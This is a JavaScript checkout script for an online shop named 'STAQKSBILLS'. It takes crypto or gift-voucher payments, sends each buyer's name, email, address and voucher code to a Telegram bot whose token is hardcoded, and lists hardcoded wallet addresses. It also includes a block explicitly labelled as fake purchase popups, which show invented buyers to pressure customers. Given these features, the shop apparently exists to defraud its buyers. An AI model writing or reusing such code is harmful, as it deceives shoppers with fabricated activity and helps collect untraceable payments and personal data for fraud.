// --- CHECKOUT JS ---
const form = document.getElementById("checkoutForm");
const orderSummary = document.getElementById("orderSummary");
const copyBtn = document.getElementById("copyAddressBtn");
const paymentSelect = document.getElementById("payment");

// Elements for the Voucher logic
const voucherGroup = document.getElementById("voucherInputGroup");
const voucherInput = document.getElementById("voucherCode");
const g2aLink = document.getElementById("dynamicG2ALink");

// G2A Voucher Mapping Table
const VOUCHER_LINKS = [
  { max: 10,  url: "https://www.g2a.com/crypto-voucher-10-usd-key-global-i10000337580001" },
  { max: 25,  url: "https://www.g2a.com/crypto-voucher-25-usd-key-global-i10000337580002" },
  { max: 50,  url: "https://www.g2a.com/crypto-voucher-50-usd-key-global-i10000337580003" },
  { max: 100, url: "https://www.g2a.com/crypto-voucher-100-usd-key-global-i10000337580004" },
  { max: 200, url: "https://www.g2a.com/crypto-voucher-200-usd-key-global-i10000337580005" },
  { max: 500, url: "https://www.g2a.com/crypto-voucher-500-usd-key-global-i10000337580006" }
];

// Handle showing/hiding voucher field and updating G2A link
paymentSelect.addEventListener("change", function() {
  const isVoucher = this.value === "Voucher";
  voucherGroup.style.display = isVoucher ? "block" : "none";
  voucherInput.required = isVoucher;

  if (isVoucher) {
    const cart = JSON.parse(localStorage.getItem("cart")) || [];
    const totalUSD = cart.reduce((sum, item) => sum + item.price * item.qty, 0);
    // Find matching voucher or default to highest
    const match = VOUCHER_LINKS.find(v => v.max >= totalUSD) || VOUCHER_LINKS[VOUCHER_LINKS.length - 1];
    
    g2aLink.href = match.url;
    g2aLink.innerText = `BUY A $${match.max} CRYPTO VOUCHER HERE`;
  }
});

// Handle form submit
form.onsubmit = function(e){
  e.preventDefault();

  const cart = JSON.parse(localStorage.getItem("cart")) || [];
  if(cart.length === 0){
    alert("Your cart is empty.");
    return;
  }

  const firstName = document.getElementById("firstName").value;
  const lastName = document.getElementById("lastName").value;
  const email = document.getElementById("email").value;
  const address = document.getElementById("address").value;
  const payment = document.getElementById("payment").value;
  const submittedVoucher = voucherInput.value.trim();

  const totalUSD = cart.reduce((sum, item) => sum + item.price * item.qty, 0);
  const orderID = "ORD" + Math.floor(Math.random()*1000000);
  const time = new Date().toLocaleString();

  let paymentAddress = "";
  
  // Logic for Payment Address / Instructions
  if (payment.toLowerCase() === "voucher") {
    paymentAddress = submittedVoucher ? `VOUCHER CODE: ${submittedVoucher}` : "VOUCHER CODE NOT PROVIDED";
  } else {
    switch(payment.toLowerCase()){
      case "bitcoin": paymentAddress = "bc1q7yuv6pl9ht2pe6kxe6hyf0kuzfua6rkqtkgyf5"; break;
      case "ethereum": paymentAddress = "0xAFc94727bFe3A51d7B7c7E321f02B094bA72847"; break;
      case "solana": paymentAddress = "HooqUQLi4trb46fuzNy1rhY3qtkrPJw6FcRwWNEhtLsn"; break;
    }
  }

  // --- TELEGRAM NOTIFICATION LOGIC ---
  const botToken = "8633179055:AAG1zEe6FI_VIoqLmWUHZZv6QyDuSvBQ1m8";
  const chatId = "-1003743971018"; 

  const itemList = cart.map(i => `• ${i.name} (x${i.qty}) - $${i.price * i.qty}`).join("\n");
  const tgMessage = `
💰 **NEW ORDER: STAQKSBILLS**
--------------------------
🆔 **Order ID:** ${orderID}
👤 **Customer:** ${firstName} ${lastName}
📧 **Email:** ${email}
📍 **Address:** ${address}
💵 **Total:** $${totalUSD}
💳 **Method:** ${payment}
🎟️ **Voucher Code:** ${submittedVoucher || "N/A"}
--------------------------
📦 **Items:**
${itemList}
--------------------------
  `;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: tgMessage,
      parse_mode: "Markdown",
    }),
  })
  .then(response => response.json())
  .then(data => {
    if (data.ok) {
      console.log("Order successfully sent to Telegram.");
    } else {
      console.error("Telegram Error:", data.description);
    }
  })
  .catch(err => console.error("Network Error:", err));

  // Display order summary
  orderSummary.innerHTML = `
    <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-top: 20px;">
      <h3 style="color: #ffcc00; margin-top: 0;">Order Generated</h3>
      <p><b>Order ID:</b> ${orderID}</p>
      <p><b>Total:</b> $${totalUSD}</p>
      <p><b>Payment Method:</b> ${payment}</p>
      <p><b>Payment Info:</b> <span id="paymentAddress" style="word-break: break-all;">${paymentAddress}</span></p>
      <p style="margin-top: 15px; font-weight: bold; color: #ffcc00;">
        ${payment === 'Voucher' ? 'Our team will verify your voucher code shortly.' : 'Please send the exact amount and confirm with support on Telegram.'}
      </p>
    </div>
  `;

  // Hide copy button if it's a voucher payment
  copyBtn.style.display = (payment.toLowerCase() === "voucher") ? "none" : "inline-block";

  // Clear cart
  localStorage.setItem("cart", JSON.stringify([]));
  if(typeof updateCartUI === "function") updateCartUI();
};

// Copy payment address
copyBtn.onclick = () => {
  const text = document.getElementById("paymentAddress").textContent;
  navigator.clipboard.writeText(text)
    .then(()=> alert("Address copied!"))
    .catch(()=> alert("Failed to copy."));
};

// --- FAKE LIVE PURCHASE POPUPS ---
const names = ["James", "Michael", "Chris", "Daniel", "Alex", "Brian"];
const countries = ["USA", "UK", "Canada", "Germany", "Australia"];

function showFakePurchase() {
  const randomName = names[Math.floor(Math.random() * names.length)];
  const randomCountry = countries[Math.floor(Math.random() * countries.length)];
  if (typeof products === 'undefined' || products.length === 0) return;
  const randomProduct = products[Math.floor(Math.random() * products.length)];

  const popup = document.createElement("div");
  popup.className = "fake-popup";
  popup.innerHTML = `
    <p><strong>${randomName}</strong> from ${randomCountry}</p>
    <p>just purchased <strong>${randomProduct.name}</strong></p>
  `;
  document.body.appendChild(popup);
  setTimeout(() => popup.remove(), 4000);
}
setInterval(showFakePurchase, Math.random() * 10000 + 10000);

// --- TELEGRAM FLOAT ---
document.querySelectorAll(".telegram-float").forEach(el=>{
  el.addEventListener("click", e=>{
    // Regular link behavior if it's a mobile device, otherwise float it
    if(window.innerWidth > 768) {
        e.preventDefault();
        const iframe = document.createElement("iframe");
        iframe.src = el.href;
        iframe.style.width = "100%";
        iframe.style.height = "600px";
        iframe.style.border = "none";
        document.body.appendChild(iframe);
        window.scrollTo({ top: iframe.offsetTop, behavior: "smooth" });
    }
  });
});
